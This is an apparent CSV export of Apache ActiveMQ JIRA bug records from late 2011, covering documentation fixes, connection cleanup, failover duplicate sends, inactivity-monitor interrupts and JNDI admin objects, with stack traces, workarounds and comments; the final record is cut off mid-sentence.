Documentation on integration with spring contains misleading part regarding embedded broker,AMQ-3580,12530356,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,izapolsky@gmail.com,izapolsky@gmail.com,04/Nov/11 17:30,13/Nov/13 14:09,14/Jul/23 05:43,13/Nov/13 14:09,,,,,,5.10.0,,,Documentation,,,,0,,,,,,,,,"Hi,

There is a misleading part in how to configure activemq with spring if someone's needs an embedded broker:
(section Using an embedded broker).

This section references BrokerFactoryBean to use to instantiate broker within spring context. Unfortunately this class is deficient in a way it will terminate a broker immidiately after factory was used and destroyed. 


",http://activemq.apache.org/spring-support.html,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,216094,,,Wed Nov 13 14:09:30 UTC 2013,,,,,,,,,,,"0|i0eb0v:",81548,,,,,,,,,,,,,,,,,,,,,"13/Nov/13 14:09;davsclaus;Removed that outdated way of embedding a broker, as you use the <amq:broker> namespace;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The Connection is not cleanup properly whenever the close method is called within a thread that was interrupted.,AMQ-3577,12530076,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,ccorsi,ccorsi,03/Nov/11 16:12,03/Nov/11 17:28,14/Jul/23 05:43,03/Nov/11 17:28,5.5.1,,,,,5.6.0,,,Broker,JMS client,,,0,,,,,,,,,"The connection close method does not properly clean up the connection on the broker.

This is causing a memory leak on the broker because the connection is dangling.

I have not confirmed that trying to call the close method within a non-interrupted thread will properly cleanup the connection after it was already called within an interrupted thread.

I have a test case that reproduces this issue and a patch that corrects the problem.
",any environment.,andras,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,215935,,,Thu Nov 03 17:28:15 UTC 2011,,,,,,,Patch Available,,,,"0|i0ailj:",59286,,,,,,,,,,,,,,,,,,,,,"03/Nov/11 16:16;ccorsi;One more comment, I was able to produce an OOM exception by creating a connection, interrupting the thread and calling the close method in a loop.  

You can see that the connection was never cleaned up properly and eventually the broker slows to a crawl because of the OOM.

With the patch, the broker keeps going without any issues.

The main difference is that the thread count is increasing without the fix and with it the thread count does not.

A simple workaround is that the user calls does the following:

{code}

   // This will clear the interrupted state to allow the connection to cleanup properly
   boolean interrupt = Thread.interrupted();

   connection.close();

   if (interrupted) 
     // This will reset the interrupt state for this thread.
     Thread.currentThread().interrupt();

{code}

;;;","03/Nov/11 16:36;gtully;note: internally the broker should not be calling interrupt unless it catches an interrupted exception. But is should be able to handle interrupted exceptions as the occur in normal processing and continue if necessary.;;;","03/Nov/11 16:44;ccorsi;Agreed, but this is caused by the client not properly handling an interrupted thread.  The broker does not seem to get the request to close the connection which gives the broker the impression that the connection is still active on the client side when in fact it was closed.

You can see the problem by just doing the following:

  1 - create a connection
  2 - interrupt the thread
  3 - close the connection
  4 - repeat 1-3 over and over

open the jconsole and check the thread count on the broker.  it keeps increasing until you get an oom exception.
;;;","03/Nov/11 17:28;ccorsi;This issue was fixed in trunk by Tim on the 29th of Oct.

The commit is http://svn.apache.org/viewvc/activemq/trunk/activemq-core/src/main/java/org/apache/activemq/ActiveMQConnection.java?r1=1195044&r2=1195045&.

He applied the same scheme that I was using to resolve the issue.

Note that the InvalidClientIDException was a symptom of this.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ProducerBrokerExchange last producer sequenceId initialization needs runtime updates to deal with possible duplicate resends,AMQ-3576,12529900,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,02/Nov/11 17:03,27/Mar/12 12:29,14/Jul/23 05:43,24/Nov/11 17:05,5.5.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"Under load, a  buffered pending send can be replayed along with a failover replay (writeTimeFilter initiated) which can miss the audit b/c it won't have knowledge of the original send.
The dispatch decision is based on the current stored state at the time of reconnect with the expectation that the next message will not be duplicated. It seems under some load and tcp buffering conditions this is possible to get duplicate sends of new messages.
 ",failover:(tcp://host:port?soWriteTimeout=500)?jms.useAsyncSend=true&trackMessages=true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3525,AMQ-3473,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,215759,,,Thu Nov 24 17:05:23 UTC 2011,,,,,,,,,,,"0|i0ailr:",59287,,,,,,,,,,,,,,,,,,,,,"02/Nov/11 21:20;gtully;Solution is to update the producerbrokerexchange sequence on each successful send so that it is aware of duplicates at any point in the message stream.;;;","02/Nov/11 21:20;gtully;resolution in http://svn.apache.org/viewvc?view=rev&rev=1196804;;;","03/Nov/11 16:25;gtully;The network connector case needs some special treatment. In a network connector, a single producer resends messages from multiple original producers so a single audit does not make sense as it will depends on sequence order across producers, which is not probable.
The solution for network connector producers requires querying the persistence adapter before each send. This will place additional synchronization contention on the store so if duplicates are not a problem it can be disabled. There is a new boolean {{auditNetworkProducers}} attribute on a TransportConnector that toggles the behavior. It defaults to -true- false.

Update in: http://svn.apache.org/viewvc?rev=1197203&view=rev;;;","24/Nov/11 15:30;gtully;The default true for auditNetworkProducers needs more consideration. networkConnector audit is problematic for composite destinations and virtual topics and when conduit=false b/c the source broker generates the duplicates, independent of a producer.
When none of the above features are enabled, a vanilla network, the audit is valuable to catch the case where a reply is lost to a successful send.;;;","24/Nov/11 17:05;gtully;http://svn.apache.org/viewvc?rev=1205930&view=rev

default value for auditNetworkProducers=false such that networks with virtual topics and/or composite destinations do not regress.
Relevant test:
{code}mvn test -Dtest=SimpleNetworkTest,BrowseOverNetworkTest,TwoBrokerNetworkConnectorWildcardStaticallyIncludedDestinationTest,TwoBrokerVirtualDestDinamicallyIncludedDestTest,TwoBrokerQueueClientsReconnectTest{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Failover transport race condition causes intermittent incomplete bridge connections,AMQ-3575,12529894,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,adphillips,adphillips,02/Nov/11 16:45,03/Jan/12 14:53,14/Jul/23 05:43,03/Jan/12 14:53,5.5.0,,,,,5.6.0,,,Transport,,,,1,,,,,,,,,"There is a race condition in FailoverTransport.java that sometimes results in preventing network bridge connections from starting.  This is a serious issue as it was preventing us from setting up failover connections between brokers.  I would have asked it be critical if it weren't for a workaround.  The workaround I have found is as follows:

Turn on activemq thread pooling option to avoid failover bridge connection race condition.  Change the following property to in your start script to make it false like so.  Somehow this got me around the problem of the wrong thread sometimes winning:
-Dorg.apache.activemq.UseDedicatedTaskRunner=false

I've attached a unit test to be dropped in activemq-core/src/test/java/org/apache/activemq/transport/failover.  The unit test shows that when a delay is introduced in setting of the TransportListener, the BrokerInfo command required to complete the bridge connection will never be processed.  There are two unit tests in this class and both are designed to pass.  The test called ""testTcpThreadWinsPreventsCompletionOfBridge"" passes by asserting that it *did not* receive the BrokerInfo command.  You can see through setting the delay value that you can control whether the Main thread wins (in which case all is well), or the TCP thread wins (in which case the network bridge is hung and fails to start)

Note, this issue only affects network bridge connections which are setup with failover transport, such as a broker that connects to a Master-Slave pair, e.g. failover://(tcp://master:61616,tcp://slave:61616)?randomize=false",CentOS 5.5 and Mac OSX10,adphillips,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3542,,,,,,,,,,,,,,,,"02/Nov/11 16:47;adphillips;FailoverNetworkConnectionRaceConditionTest.java;https://issues.apache.org/jira/secure/attachment/12501984/FailoverNetworkConnectionRaceConditionTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,215753,,,Tue Jan 03 14:53:48 UTC 2012,,,,,,,,,,,"0|i0ailz:",59288,,,,,,,,,,,,,,,,,,,,,"02/Nov/11 23:26;gtully;Can you validate against trunk, with
{code} Assert.assertTrue(""Unexpected state: BrokerInfo command was processed"", brokerInfoProcessed);{code} the test works on trunk, which if I understand you correctly, validates that this is fixed. correct?

In general, using static:failover: has proven to be problematic. failover hides transport errors but a network bridge is designed to recover from such errors by recreating the bridge so failover should be configured to not reconnect.
see: https://issues.apache.org/jira/browse/AMQ-3542;;;","02/Nov/11 23:28;gtully;linking to the issue that I think resolved this.;;;","03/Jan/12 14:53;tabish;Testing with the proper assertion and repeated attempt shows that on trunk the issue is fixed.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Links to examples of xml configuration of embedded brokers broken,AMQ-3572,12529432,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,sslavic,sslavic,31/Oct/11 02:04,31/Oct/11 19:12,14/Jul/23 05:43,31/Oct/11 19:12,5.5.1,,,,,,,,Documentation,Samples,,,0,,,,,,,,,"Links at [""Apache ActiveMQ > Using ActiveMQ > Xml Configuration"" page to examples for configuring embedded brokers|http://activemq.apache.org/xml-configuration.html#XmlConfiguration-Configuringembeddedbrokers] are broken.

I guess second example link should be renamed and lead to https://svn.apache.org/repos/asf/activemq/trunk/assembly/src/test/java/org/apache/activemq/config/BrokerXmlConfigStartTest.java

",,sslavic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,215292,,,Mon Oct 31 19:12:27 UTC 2011,,,,,,,,,,,"0|i182zj:",255286,,,,,,,,,,,,,,,,,,,,,"31/Oct/11 19:12;tabish;Updated the Wiki links;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Documentation Does not cover Compression Support,AMQ-3571,12529185,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,,edwardost,edwardost,28/Oct/11 02:34,29/Oct/11 21:50,14/Jul/23 05:43,29/Oct/11 21:50,5.5.1,,,,,,,,Documentation,,,,0,,,,,,,,,Documentation for compression at http://activemq.apache.org/cms/openwire-support.html does not indicated that compression is supported.,,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,215045,,,Sat Oct 29 21:50:52 UTC 2011,,,,,,,,,,,"0|i182z3:",255284,,,,,,,,,,,,,,,,,,,,,"29/Oct/11 21:50;tabish;wiki page updated to remove the comment about no support for compression.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Consumer auto acking of duplicate message dispatch can lead to Unmatched acknowledge: and redelivery,AMQ-3568,12528927,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,gtully,gtully,26/Oct/11 17:50,27/Oct/11 10:28,14/Jul/23 05:43,27/Oct/11 10:28,5.5.0,5.5.1,,,,5.6.0,,,Broker,JMS client,,,0,dispatch,duplicate,failover,,,,,,"{code}javax.jms.JMSException: Unmatched acknowledge: MessageAck {commandId = 4208, responseRequired = false, ackType = 2, consumerId = ID:gtmbp.local-35153-1319651042567-3:2:1:1, firstMessageId = ID:gtmbp.local-35153-1319651042567-3:2:1:975:2, lastMessageId = ID:gtmbp.local-35153-1319651042567-3:2:1:1050:2, destination = queue://TestQueue, transactionId = null, messageCount = 151, poisonCause = null}; Expected message count (151) differs from count in dispatched-list (152)
	at org.apache.activemq.broker.region.PrefetchSubscription.assertAckMatchesDispatched(PrefetchSubscription.java:455)
	at org.apache.activemq.broker.region.PrefetchSubscription.acknowledge(PrefetchSubscription.java:206)
	at org.apache.activemq.broker.region.AbstractRegion.acknowledge(AbstractRegion.java:427)
	at org.apache.activemq.broker.region.RegionBroker.acknowledge(RegionBroker.java:569)
	at org.apache.activemq.broker.BrokerFilter.acknowledge(BrokerFilter.java:77)
	at org.apache.activemq.broker.TransactionBroker.acknowledge(TransactionBroker.java:276)
	at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87)
	at org.apache.activemq.broker.MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:87)
	at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:477)
	at org.apache.activemq.command.MessageAck.visit(MessageAck.java:229)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:318)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:181)
	at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:229)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:222){code}

Problem occurs when a duplicate dispatch is one of many inflight messages to a destination. The duplicate detection auto acks with a standard ack in place of an individual ack. The standard ack results in an exception in this case because it does not match the dispatch list of the broker. optimizeAcknowledge on the connection factory seems to make this more probable. The duplicate originates from a failover: recovery/reconnect resend.

The end result is pending messages on the queue and redelivery after a restart.

In some cases, the need for duplicate detection can be circumvented at source via the kahaDB store producer audit, the default LRU cache size is 64. Increasing this can help.{code}<kahaDB ... maxFailoverProducersToTrack=""2048"" />{code}",,donnchadh,sbrandt,sslavic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,214787,,,Thu Oct 27 10:28:30 UTC 2011,,,,,,,,,,,"0|i0ags7:",58992,,,,,,,,,,,,,,,,,,,,,"27/Oct/11 10:28;gtully;fix in http://svn.apache.org/viewvc?rev=1189700&view=rev

Added a warning when this occurs as it is an indication that duplicate suppression using the store producer audit is lacking. This sort of duplicate should be identified at source. the source is a failover reconnect with a pending send that happens after the original message is dispatched and after the cursor and producer audit windows are exceeded.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
The InactivityMonitor onException call interrupts itself when the readCheckTime was exceeded.,AMQ-3567,12528814,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,,ccorsi,ccorsi,26/Oct/11 03:30,26/Oct/11 18:36,14/Jul/23 05:43,26/Oct/11 18:36,5.5.0,5.5.1,,,,5.6.0,,,JMS client,,,,0,patch,,,,,,,,"The process that activemq uses to check if there has been inactivity for a connection has a flaw when it tries to close the connection because of inactivity. The current process generates the following interrupt exception. 

{code} 
2011-10-25 12:13:56,878 | DEBUG | org.apache.activemq.util.ServiceSupport - Could not stop service: tcp://localhost/127.0.0.1:61616. Reason: java.lang.InterruptedException
java.lang.InterruptedException
    at java.util.concurrent.locks.AbstractQueuedSynchronizer.tryAcquireSharedNanos(AbstractQueuedSynchronizer.java:1302)
    at java.util.concurrent.CountDownLatch.await(CountDownLatch.java:253)
    at org.apache.activemq.transport.tcp.TcpTransport.doStop(TcpTransport.java:553)
    at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:70)
    at org.apache.activemq.transport.tcp.TcpTransport.stop(TcpTransport.java:570)
    at org.apache.activemq.transport.InactivityMonitor.stop(InactivityMonitor.java:132)
    at org.apache.activemq.transport.TransportFilter.stop(TransportFilter.java:65)
    at org.apache.activemq.transport.WireFormatNegotiator.stop(WireFormatNegotiator.java:91)
    at org.apache.activemq.util.ServiceSupport.dispose(ServiceSupport.java:43)
    at org.apache.activemq.transport.failover.FailoverTransport.disposeTransport(FailoverTransport.java:207)
    at org.apache.activemq.transport.failover.FailoverTransport.handleTransportFailure(FailoverTransport.java:223)
    at org.apache.activemq.transport.failover.FailoverTransport$3.onException(FailoverTransport.java:184)
    at org.apache.activemq.transport.TransportFilter.onException(TransportFilter.java:101)
    at org.apache.activemq.transport.WireFormatNegotiator.onException(WireFormatNegotiator.java:160)
    at org.apache.activemq.transport.InactivityMonitor.onException(InactivityMonitor.java:265)
    at org.apache.activemq.transport.InactivityMonitor$4.run(InactivityMonitor.java:185)
    at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
    at java.lang.Thread.run(Thread.java:680)
{code} 

This is caused because the spawned thread in the AbstractInactivityMonitor classes readCheck method calls the onException method. This method will then call the stopMonitorThreads method which subsequently calls the shutdownNow method of the ASYNC_TASKS executor. This call causes the executor to call the interrupt method for all active threads in the executor. The problem is that the calling thread is part of the ASYNC_TASKS executor and therefore it is generating the interrupt exception. 

Here is the stack trace of the call that is causing the interrupt. 

{code} 
Daemon Thread [InactivityMonitor Async Task: java.util.concurrent.ThreadPoolExecutor$Worker@66da9ea4] (Suspended (entry into method interrupt in Thread))   
    Thread.interrupt() line: 902   
    ThreadPoolExecutor$Worker.interruptNow() line: 855   
    ThreadPoolExecutor.shutdownNow() line: 1167   
    InactivityMonitor.stopMonitorThreads() line: 363   
    InactivityMonitor.onException(IOException) line: 264   
    InactivityMonitor$4.run() line: 185   
    ThreadPoolExecutor$Worker.runTask(Runnable) line: 886   
    ThreadPoolExecutor$Worker.run() line: 908   
    Thread.run() line: 680  
{code} 


The solution is to replace the shutdownNow method call with shutdown. Subsequent testing with this change does not cause the interrupt exception. 

I was able to create a testcase that reproduces this issue. The testcase uses the useInactivityMonitor=false attribute to reproduce this issue, thanks Gary for the hint. Unfortunately there aren't any steps that I can use to determine that the raised interrupted exception was raised or not. The test will pass either way. 

A patch will be added to this issue.


",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"26/Oct/11 16:33;ccorsi;inactivitymonitor.patch;https://issues.apache.org/jira/secure/attachment/12500897/inactivitymonitor.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,214674,,,Wed Oct 26 18:36:04 UTC 2011,,,,,,,Patch Available,,,,"0|i0aimn:",59291,,,,,,,,,,,,,,,,,,,,,"26/Oct/11 16:33;ccorsi;Here is the patch for this issue.

The patch also includes a test that will reproduce the exception but the thing to note is that to be able to confirm that the patch worked.  I needed to use the underlying log4j logging implementation.  The test will depend on that to be able to confirm that it works.  If in the future activemq intends to use a different slf4j bridge then this test case will need to be updated.
;;;","26/Oct/11 18:36;tabish;Applied the patch, made some mods to the test to remove the hardcoding of port 61616.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
HttpTransport can generate an IllegalStateException when KeepAliveResponseRequired = true,AMQ-3562,12528554,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,tabish,tabish,tabish,24/Oct/11 20:50,24/Oct/11 20:50,14/Jul/23 05:43,24/Oct/11 20:50,5.6.0,,,,,5.6.0,,,Transport,,,,0,,,,,,,,,"When the InactivityMonitor is configured to require keep alive responses the DefaultHttpClient used in the HttpTransport can throw an IllegalStateException, the client should be created with a ThreadSafeClientConnManager instance to avoid this error.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,214414,,,Mon Oct 24 20:50:55 UTC 2011,,,,,,,,,,,"0|i0ainj:",59295,,,,,,,,,,,,,,,,,,,,,"24/Oct/11 20:50;tabish;Fix applied on trunk.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Destinations do not implement javax.resource.Referenceable and will not be registerable in JNDI by some compliant JCA containers.,AMQ-3560,12528333,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,insipid,insipid,21/Oct/11 22:30,31/Jul/13 16:56,14/Jul/23 05:43,31/Jul/13 16:56,5.5.1,,,,,5.9.0,,,,,,,0,destinations,jca,jndi,,,,,,"According to the JCA spec, AdminObjects are only guaranteed to be bound in JNDI by the JCA provider if javax.resource.Referenceable is implemented.  See 13.4.2.3 ""Administered Objects"".  A JMS provider is free to provide AdminObjects that implement only javax.naming.Referenceable in an otherwise unmanaged environment, but a resource adapter must allow the application server/jca container to use its own ObjectFactory and call setReference() on the admin objects that need to be looked up.  See 20.6 JNDI Configuration and Lookup.

This is a problem for users using an application server such as the current release of AS7 which will not bind AdminObjects otherwise.",JBoss 7.1.0.Alpha2 / ironjacamar 1.0.4,gtully,insipid,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,113445,,,Wed Jul 31 16:56:54 UTC 2013,,,,,,,,,,,"0|i0ttr3:",172129,,,,,,,,,,,,,,,,,,,,,"25/Oct/11 22:34;gtully;another good candidate for 5.6, should be an easy fix.;;;","26/Oct/11 18:03;tabish;ActiveMQDestination already extends JNDIBaseStorable which in turn implements Referencable so I'm not sure what it is we are missing here.  Perhaps some addition information is needed on this.;;;","27/Oct/11 13:55;insipid;JNDIBaseStorable implements javax.naming.Referenceable not javax.resource.Referenceable.

""An administered object instance, that implements ResourceAdapterAssociation
interface must ensure that its Java class and the interface type implements
javax.resource.Referenceable and java.io.Serializable interfaces. This
enables an application server to store the administered object instance in the JNDI
naming environment. Refer to Section 20.6.3, “Scenario: Referenceable” on
page 20-19 for details on the JNDI reference mechanism.""

However, it does sound like this requirement is only for RA Associated objects.  On the other hand, it says do this to enable JNDI storage.  Also Ironjacamar was patched to no longer require adminobjects to implement javax.resource.Referenceable for JNDI binding, making this no longer a problem for AS7 users.  Perhaps this issue should be rejected?;;;","27/Oct/11 16:14;tabish;This sounds like its not needed then.  Closing out;;;","31/Jul/13 16:46;gtully;Adding an XAPooledConnectionFactory as an admin object for jboss eap 6.1 resulted in the same sort of error so the checks still being done but support for referenceable seems to be sufficient.
{code}
16:40:23,024 INFO  [org.jboss.as.connector.deployers.RaXmlDeployer] (MSC service thread 1-1) IJ020014: Admin object not specification compliant. See 13.4.2.3 for additional details: org.apache.activemq.pool.XaPooledConnectionFactory{code}

Will fix this by having PooledConnectionFactory extend org.apache.activemq.jndi.JNDIBaseStorable;;;","31/Jul/13 16:56;gtully;fix in http://svn.apache.org/r1508958

example admin objects from eap standalone.xml:{code}
            ....
            <admin-objects>
              <admin-object class-name=""org.apache.activemq.command.ActiveMQQueue""
                            jndi-name=""jms_ee_mdb_mdb_rec_MDB_QUEUE"" pool-name=""jms_ee_mdb_mdb_rec_MDB_QUEUE"">
                <config-property name=""PhysicalName"">tck6.jms_ee_mdb_mdb_rec_MDB_QUEUE</config-property>
              </admin-object>
              <admin-object class-name=""org.apache.activemq.command.ActiveMQQueue"" jndi-name=""MDB_QUEUE_REPLY""
                            pool-name=""MDB_QUEUE_REPLY"">
                <config-property name=""PhysicalName"">tck6.MDB_QUEUE_REPLY</config-property>
              </admin-object>
              <admin-object class-name=""org.apache.activemq.command.ActiveMQTopic""
                            jndi-name=""jms_ee_mdb_mdb_rec_MDB_TOPIC"" pool-name=""jms_ee_mdb_mdb_rec_MDB_TOPIC"">
                <config-property name=""PhysicalName"">tck6.jms_ee_mdb_mdb_rec_MDB_TOPIC</config-property>
              </admin-object>
              <admin-object class-name=""org.apache.activemq.pool.XaPooledConnectionFactory""
                            jndi-name=""jms/RegularQueueConnectionFactory""
                            pool-name=""RegularQueueConnectionFactory"">
                <config-property name=""brokerUrl"">tcp://localhost:61616</config-property>
                <config-property name=""tmFromJndi"">true</config-property>
              </admin-object>
            </admin-objects>
          </resource-adapter>

{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB NPE when loading data from previous versions,AMQ-3559,12528317,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,tabish,tabish,21/Oct/11 20:32,04/Jan/12 10:23,14/Jul/23 05:43,21/Oct/11 21:01,5.6.0,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,When loading a data directory containing KahaDB logs from previous versions a NPE exception can be encountered.  The new Version in 5.6 is v4 however an if statement in the MessageDatabase still checks against a current of v3.  Code needs to be updated to use the VERSION field to ensure its checking against the most current 